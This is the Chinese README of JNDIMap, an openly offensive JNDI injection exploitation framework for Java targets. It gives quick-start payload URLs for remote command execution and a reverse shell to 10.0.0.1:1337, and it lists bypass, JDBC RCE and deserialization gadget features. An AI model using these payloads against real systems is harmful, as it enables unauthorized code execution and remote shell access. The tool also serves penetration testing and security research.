<div align="center">
    <img src="img/logo.png" width="128" />
    <h1 align="center">JNDIMap</h1>
</div>

<p align="center">
<img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/X1r0z/JNDIMap">
<img alt="GitHub forks" src="https://img.shields.io/github/forks/X1r0z/JNDIMap">
<img alt="Static Badge" src="https://img.shields.io/badge/Java-8-blue">
<img alt="GitHub Downloads (all assets, all releases)" src="https://img.shields.io/github/downloads/X1r0z/JNDIMap/total">
<img alt="GitHub Release" src="https://img.shields.io/github/v/release/X1r0z/JNDIMap">
<img alt="GitHub License" src="https://img.shields.io/github/license/X1r0z/JNDIMap">

<p align="center">
JNDIMap 是一个强大的 JNDI 注入利用框架, 支持 RMI、LDAP 和 LDAPS 协议, 包含多种高版本 JDK 绕过方式
</p>
<p align="center">简体中文 | <a href="README.en.md">English</a></p>
</p>

## 🚀 快速上手

在 [Release](https://github.com/X1r0z/JNDIMap/releases) 页面下载 JNDIMap, 运行时传入 `-i` 参数指定外部 IP

```bash
java -jar JNDIMap-version.jar -i 10.0.0.1
```

在目标机器上执行命令或反弹 Shell

```bash
rmi://10.0.0.1:1099/Basic/Command/open -a Calculator
ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
```

## 🚩 功能特性

- DNSLog
- 命令执行
- 反弹 Shell
- Meterpreter 上线
- 加载自定义 Java 字节码
- Nashorn JS 自定义 Payload
- BeanFactory 绕过
  - Tomcat
  - Groovy
  - XStream
  - SnakeYaml
  - BeanShell
  - MVEL
  - MLet
  - NativeLibLoader
- JDBC RCE (MySQL/PostgreSQL/H2/Derby)
  - Commons DBCP
  - Tomcat DBCP
  - Tomcat JDBC
  - Alibaba Druid
  - HikariCP
- LDAP 反序列化:
  - CommonsCollections K1-K4
  - CommonsBeanutils183
  - CommonsBeanutils194
  - Jackson
  - Fastjson1
  - Fastjson2

## 📖 使用指南

> 完整文档: [USAGE.md](USAGE.md)

- [Usage](USAGE.md#usage)
- [URL 格式](USAGE.md#url-格式)
- [Basic 功能](USAGE.md#basic)
- [BeanFactory 绕过](USAGE.md#beanfactory-bypass)
  - [Tomcat ELProcessor](USAGE.md#tomcat-elprocessor)
  - [Groovy ClassLoader/Shell](USAGE.md#groovy-classloadershell)
  - [XStream](USAGE.md#xstream)
  - [SnakeYaml](USAGE.md#snakeyaml)
  - [BeanShell](USAGE.md#beanshell)
  - [MVEL](USAGE.md#mvel)
  - [MLet](USAGE.md#mlet)
  - [NativeLibLoader](USAGE.md#nativelibloader)
- [JDBC RCE](USAGE.md#jdbc-rce)
  - [MySQL](USAGE.md#mysql)
    - [MySQL JDBC 反序列化 RCE](USAGE.md#mysql-jdbc-反序列化-rce)
    - [MySQL 客户端任意文件读取](USAGE.md#mysql-客户端任意文件读取)
  - [PostgreSQL](USAGE.md#postgresql)
  - [H2 Database](USAGE.md#h2)
  - [Apache Derby](USAGE.md#derby)
    - [Derby SQL RCE](USAGE.md#derby-sql-rce)
    - [Derby 主从复制反序列化 RCE](USAGE.md#derby-主从复制反序列化-rce)
- [LDAP Deserialization](USAGE.md#ldap-deserialization)
- [Script](USAGE.md#script)
- [useReferenceOnly](USAGE.md#usereferenceonly)
- [fakeClassName](USAGE.md#fakeclassname)

## ⚙️ 编译

[Releases](https://github.com/X1r0z/JNDIMap/releases) 的版本可能存在滞后, 推荐在使用时拉取源码自行编译 (基于 JDK 8)

```bash
git clone https://github.com/X1r0z/JNDIMap && cd JNDIMap
mvn package -Dmaven.test.skip=true
```

## 📷 参考 & 致谢

[https://tttang.com/archive/1405/](https://tttang.com/archive/1405/)

[https://paper.seebug.org/1832/](https://paper.seebug.org/1832/)

[https://xz.aliyun.com/t/12846](https://xz.aliyun.com/t/12846)

[http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce](http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce)

[https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson 与原生反序列化/](https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)

[https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson 与原生反序列化-二/](https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/)

[https://www.yulegeyu.com/2022/11/12/Java 安全攻防之老版本 Fastjson 的一些不出网利用/](https://www.yulegeyu.com/2022/11/12/Java%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E8%80%81%E7%89%88%E6%9C%ACFastjson-%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)

[https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/](https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/)

[https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html](https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html)

[https://exp10it.io/2025/03/h2-rce-in-jre-17/](https://exp10it.io/2025/03/h2-rce-in-jre-17/)

[https://forum.butian.net/share/4414](https://forum.butian.net/share/4414)

[https://yzddmr6.com/posts/swinglazyvalue-in-webshell/](https://yzddmr6.com/posts/swinglazyvalue-in-webshell/)

## 🌟 Star History

<a href="https://www.star-history.com/#X1r0z/JNDIMap&Date">
 <picture>
   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=X1r0z/JNDIMap&type=Date&theme=dark" />
   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=X1r0z/JNDIMap&type=Date" />
   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=X1r0z/JNDIMap&type=Date" />
 </picture>
</a>